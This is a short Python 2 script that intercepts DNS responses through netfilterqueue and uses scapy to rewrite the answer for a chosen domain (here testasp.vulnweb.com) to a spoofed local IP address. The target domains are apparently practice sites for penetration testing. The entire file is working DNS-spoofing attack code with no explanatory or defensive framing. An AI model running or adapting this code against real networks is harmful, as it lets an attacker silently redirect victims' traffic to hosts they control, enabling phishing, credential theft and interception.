#!/usr/bin/env python2
# Rebuild
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP

target_dns = ["www.pentest-standard.org","juice-shop.herokuapp.com","testasp.vulnweb.com"]
target_ip = "192.168.63.174"
target_dn = "testasp.vulnweb.com" # rrname
target_iface = "Ethernet0"
spoof_ip = "192.168.63.139"
# 44.238.29.244
# rdata = 96.126.116.56
# packet.drop()

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if target_dn in qname:
            print("[+] Spoofing Target: " + qname)
            answer = DNSRR(rrname=qname, rdata=spoof_ip)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].chksum
            del scapy_packet[UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()